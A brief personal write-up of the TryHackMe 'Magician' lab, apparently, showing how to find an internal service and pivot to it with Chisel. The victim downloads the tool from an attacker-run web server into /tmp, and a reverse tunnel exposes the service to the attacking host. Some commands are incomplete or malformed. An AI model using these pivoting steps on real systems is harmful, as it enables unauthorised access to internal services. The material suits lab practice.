# Port Forwarding Magician(tryhackme)

```bash
https://tryhackme.com/room/magician
```

ssh = tunneling + port forwarding both

vpn = tunneling

socat = port forwarding ( no security)

```bash
netstat -plant
```

**Which service runs** 

```bash
curl http://127.0.0.1:5555
```

**Now, comes port-forwarding**

**Tool needed = Chisel**

**GitHub → then releases → download**

```bash
mv ~/Downloads/chisel_1.9.1_linux_amd64.gz .
gunzip chisel_1.9.1_linux_amd64.gz
ls
mv chisel_1.9.1_linux_amd64 chisel
chmod +x chisel
python3 -m http.server 80
```

**Victim**

```bash
cd /tmp
wget chisel
chmod +x chisel
```

**Again Attacking System**

```bash
./chisel server --reverse --port 9001
```

**Target** 

```bash
./chisel client attackingip:9001 R:3333:127.0.0.1:5555
```

**Browse**

```jsx
http://attackingip/127.0.0.1:3333
```